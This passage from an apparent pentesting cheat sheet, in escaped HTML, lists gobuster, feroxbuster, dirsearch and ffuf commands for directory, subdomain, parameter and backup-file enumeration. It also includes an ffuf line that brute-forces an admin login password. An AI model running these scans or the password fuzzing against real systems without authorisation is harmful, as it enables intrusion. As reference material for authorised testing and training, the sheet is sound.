User-Agent\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egobuster dir -u http://target.com -w wordlist.txt -a \u003cspan class=\"s2\"\u003e\u0026#34;Mozilla/5.0 (Custom Agent)\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Add cookies\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egobuster dir -u http://target.com -w wordlist.txt -c \u003cspan class=\"s2\"\u003e\u0026#34;sessionid=abc123\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Add headers\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egobuster dir -u http://target.com -w wordlist.txt -H \u003cspan class=\"s2\"\u003e\u0026#34;Authorization: Bearer token123\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Proxy through Burp\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egobuster dir -u http://target.com -w wordlist.txt -p http://127.0.0.1:8080\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Recursive enumeration\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egobuster dir -u http://target.com -w wordlist.txt -r\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Follow redirects\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egobuster dir -u http://target.com -w wordlist.txt -f\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"gobuster-modes\"\u003eGobuster Modes\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Directory mode (default)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egobuster dir -u http://target.com -w wordlist.txt\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# DNS subdomain enumeration\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egobuster dns -d target.com -w subdomains.txt\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Virtual host enumeration\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egobuster vhost -u http://target.com -w vhosts.txt\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# S3 bucket enumeration\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egobuster s3 -w bucket-names.txt\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"feroxbuster\"\u003eFeroxbuster\u003c/h2\u003e\n\u003ch3 id=\"basic-usage\"\u003eBasic Usage\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Basic directory scan\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eferoxbuster -u http://target.com\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# With wordlist\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eferoxbuster -u http://target.com -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Medium directory scan\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eferoxbuster -u http://soccer.htb -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"advanced-feroxbuster-features\"\u003eAdvanced Feroxbuster Features\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Multiple extensions\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eferoxbuster -u http://target.com -x php,html,txt,js\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Specific depth\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eferoxbuster -u http://target.com --depth \u003cspan class=\"m\"\u003e4\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Rate limiting\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eferoxbuster -u http://target.com --rate-limit \u003cspan class=\"m\"\u003e10\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Custom threads\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eferoxbuster -u http://target.com -t \u003cspan class=\"m\"\u003e50\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Filter status codes\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eferoxbuster -u http://target.com -C 404,403\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Filter response size\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eferoxbuster -u http://target.com -S \u003cspan class=\"m\"\u003e1234\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Resume scan\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eferoxbuster --resume-from state.toml\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"feroxbuster-output-options\"\u003eFeroxbuster Output Options\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# JSON output\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eferoxbuster -u http://target.com -o results.json\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Silent mode\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eferoxbuster -u http://target.com --silent\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Extract links for further enumeration\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eferoxbuster -u http://target.com --extract-links\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Random delay between requests\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eferoxbuster -u http://target.com --random-agent\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"dirsearch\"\u003eDirsearch\u003c/h2\u003e\n\u003ch3 id=\"basic-commands\"\u003eBasic Commands\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Basic scan\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edirsearch -u http://target.com\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# With extensions\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edirsearch -u http://target.com -e php,html,js\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Custom wordlist\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edirsearch -u http://target.com -w custom-wordlist.txt\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Recursive scan\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edirsearch -u http://target.com -r\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Save results\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edirsearch -u http://target.com --format\u003cspan class=\"o\"\u003e=\u003c/span\u003esimple -o results.txt\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"ffuf\"\u003eFfuf\u003c/h2\u003e\n\u003ch3 id=\"directory-fuzzing\"\u003eDirectory Fuzzing\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Basic directory fuzzing\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003effuf -w wordlist.txt -u http://target.com/FUZZ\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# With extensions\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003effuf -w wordlist.txt -u http://target.com/FUZZ -e .php,.html,.txt\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Filter by response code\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003effuf -w wordlist.txt -u http://target.com/FUZZ -mc 200,301,302\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Filter by response size\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003effuf -w wordlist.txt -u http://target.com/FUZZ -fs \u003cspan class=\"m\"\u003e1234\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Output to file\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003effuf -w wordlist.txt -u http://target.com/FUZZ -o results.json -of json\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"parameter-fuzzing\"\u003eParameter Fuzzing\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# GET parameter fuzzing\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003effuf -w wordlist.txt -u \u003cspan class=\"s2\"\u003e\u0026#34;http://target.com/search?FUZZ=test\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# POST data fuzzing\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003effuf -w wordlist.txt -u http://target.com/login -X POST -d \u003cspan class=\"s2\"\u003e\u0026#34;username=admin\u0026amp;password=FUZZ\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Header fuzzing\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003effuf -w wordlist.txt -u http://target.com -H \u003cspan class=\"s2\"\u003e\u0026#34;X-Forwarded-For: FUZZ\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"wordlists\"\u003eWordlists\u003c/h2\u003e\n\u003ch3 id=\"seclists-common-paths\"\u003eSecLists Common Paths\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Small wordlists (fast)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/opt/SecLists/Discovery/Web-Content/raft-small-words.txt\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/opt/SecLists/Discovery/Web-Content/common.txt\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Medium wordlists (comprehensive)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/opt/SecLists/Discovery/Web-Content/raft-medium-files.txt\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Large wordlists (extensive)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/opt/SecLists/Discovery/Web-Content/raft-large-directories.txt\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Technology-specific\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/opt/SecLists/Discovery/Web-Content/spring-boot.txt\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/opt/SecLists/Discovery/Web-Content/apache.txt\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/opt/SecLists/Discovery/Web-Content/nginx.txt\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"custom-wordlist-creation\"\u003eCustom Wordlist Creation\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Extract words from target website\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecewl http://target.com -w custom-wordlist.txt\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Combine wordlists\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat wordlist1.txt wordlist2.txt \u003cspan class=\"p\"\u003e|\u003c/span\u003e sort -u \u0026gt; combined.txt\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Generate variations\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Add common extensions to base words\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esed \u003cspan class=\"s1\"\u003e\u0026#39;s/$/.php/\u0026#39;\u003c/span\u003e base-words.txt \u0026gt; php-files.txt\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esed \u003cspan class=\"s1\"\u003e\u0026#39;s/$/.html/\u0026#39;\u003c/span\u003e base-words.txt \u0026gt; html-files.txt\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"targeted-enumeration\"\u003eTargeted Enumeration\u003c/h2\u003e\n\u003ch3 id=\"content-management-systems\"\u003eContent Management Systems\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# WordPress\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egobuster dir -u http://target.com -w /opt/SecLists/Discovery/Web-Content/CMS/wordpress.fuzz.txt\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Drupal\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egobuster dir -u http://target.com -w /opt/SecLists/Discovery/Web-Content/CMS/drupal.fuzz.txt\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Joomla\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egobuster dir -u http://target.com -w /opt/SecLists/Discovery/Web-Content/CMS/joomla.fuzz.txt\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"file-extensions-by-technology\"\u003eFile Extensions by Technology\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# PHP applications\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egobuster dir -u http://target.com -w wordlist.txt -x php,php3,php4,php5,phtml\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# ASP/ASP.NET applications\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egobuster dir -u http://target.com -w wordlist.txt -x asp,aspx,asmx,ashx\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# JSP applications\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egobuster dir -u http://target.com -w wordlist.txt -x jsp,jspa,jspx\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Python applications\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egobuster dir -u http://target.com -w wordlist.txt -x py,pyc,pyo\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Common web files\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egobuster dir -u http://target.com -w wordlist.txt -x html,htm,js,css,xml,json\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"backup-and-sensitive-files\"\u003eBackup and Sensitive Files\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Common backup extensions\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egobuster dir -u http://target.com -w wordlist.txt -x bak,backup,old,orig,tmp\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan 